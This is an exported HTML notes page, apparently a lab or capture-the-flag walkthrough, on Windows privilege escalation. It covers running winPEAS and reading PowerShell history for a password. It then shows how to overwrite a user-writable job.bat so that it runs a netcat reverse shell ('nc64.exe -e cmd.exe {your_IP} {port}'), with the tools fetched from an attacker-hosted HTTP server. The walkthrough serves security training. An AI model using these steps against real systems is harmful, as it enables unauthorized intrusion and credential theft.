<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>privilege escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>privilege escalation</h1><br/><strong>A) Using winpeas</strong><br /><br />Assuming we already have user privilege. Get the tool for Privilege Escalation.<br /><br /><a href="https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe">https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe</a><br /><br />Run The web server in Attacker Machine to host the winPEASx64.exe:<br /><br />python3 -m http.server 80<br /><br />On Target Machine:<br /><br />powershell <br />wget <a href="http://10.10.14.9/winPEASx64.exe">http://10.10.14.9/winPEASx64.exe</a> -outfile winPEASx64.exe<br /><br /><a href=""><img src="images/25-1.png" alt="images/25-1.png" /></a><br /><br />PS C:\Users\sql_svc\Downloads&gt; .\winPEASx64.exe<br />Note: The output of the tool is long, here you will see just the small(Important) part of the output.<br /><br /><a href=""><img src="images/25-2.png" alt="images/25-2.png" /></a><br /><br />We can navigate to the folder where the PowerShell history is stored:<br /><br /><a href=""><img src="images/25-3.png" alt="images/25-3.png" /></a><br /><br />To read the file, we will type type ConsoleHost_history.txt :<br /><br /><a href=""><img src="images/25-4.png" alt="images/25-4.png" /></a><br /><br /><br />Thus, we get the password.<br /><br /><br /><strong>B) Using a admin program that runs in a batch file.</strong><br /><br /><a href=""><img src="images/25-5.png" alt="images/25-5.png" /></a><br /><br />In the following job.bat uses an admin program but can be fully accessed by the user. We exploit this.<br /><br /><a href=""><img src="images/25-6.png" alt="images/25-6.png" /></a><br /><br />The purpose of job.bat seems to be related to clearing logfiles, and it can only be run with an<br />Administrator account. There is also mention of an executable named wevtutil , which upon further<br />investigation is determined to be a Windows command that has the ability to retrieve information about<br />event logs and publishers. It can also install and uninstall event manifests, run queries and export, archive<br />and clear logs. We now understand the use of it in this case, alongside the el and cl parameters found in<br />the job.bat file.<br /><br /><br />Since the file itself can only be run by an Administrator, we could try our luck and see if our usergroup could<br />at least edit the file, instead of running it, or if there are any mismatched permissions between the script<br />and the usergroup or file configuration. We can achieve this by using the icacls command.<br /><br /><a href=""><img src="images/25-7.png" alt="images/25-7.png" /></a><br /><br />Looking at the permissions of job.bat using icacls reveals that the group BUILTIN\Users has full<br />control (F) over the file. The BUILTIN\Users group represents all local users, which includes Daniel as<br />well. We might be able to get a shell by transferring netcat to the system and modifying the script to<br />execute a reverse shell.<br /><br /><br />Before then, we need to check if the wevtutil process mentioned in the job.bat file is running. We can<br />see the currently scheduled tasks by typing the schtasks command. If our permission level doesn&#39;t allow<br />us to view this list through Windows&#39; command line, we can quickly use powershell&#39;s ps command instead,<br />which represents another security misconfiguration that works against the server.<br /><br /><br /><a href=""><img src="images/25-8.png" alt="images/25-8.png" /></a><br /><br /><br /><br />We can see that the process wevtutil is running, which is the same process listed in the job.bat file. This<br />indicates that the .bat script might be executing. (Required)<br /><br />Because the target host does not have access to the Internet, we will need to deliver the nc64.exe<br />executable through our own connection with the target. In order to do so, we will first need to download<br />nc64.exe on our system, start up a Python HTTP server on one of our ports, then switch to the shell we<br />have on the host to issue a wget command with our address and the nc64.exe file residing on our server.<br />This will initialize a download from the host to our Python server for the executable. Make sure you don&#39;t<br />switch folders after downloading the executable. The Python HTTP server needs to be running in the same<br />directory as the location of the downloaded nc64.exe file we want to deliver to the target.<br /><br /><br />In order to download the executable on our system, we can use this link:<br /><a href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe">https://github.com/int0x33/nc.exe/blob/master/nc64.exe</a><br /><br /><br /><a href=""><img src="images/25-9.png" alt="images/25-9.png" /></a><br /><br />Since we have full control over the job.bat script, we will modify its&#39; contents by running the following<br />command. Make sure to run it from the Windows Command Line, where the daniel@MARKUP user is<br />displayed before every command, and not from Windows PowerShell, where PS is displayed before every<br />command. As before, make sure to change the {your_IP} parameter with the IP address assigned to your<br />tun0 interface and the {port} parameter with a port of your choice, which you will listen for connections<br />on.<br /><br />echo C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port} &gt; C:\Log-Management\job.bat<br /><br /><br />Then listen in netcat.</div>
</body>
</html>
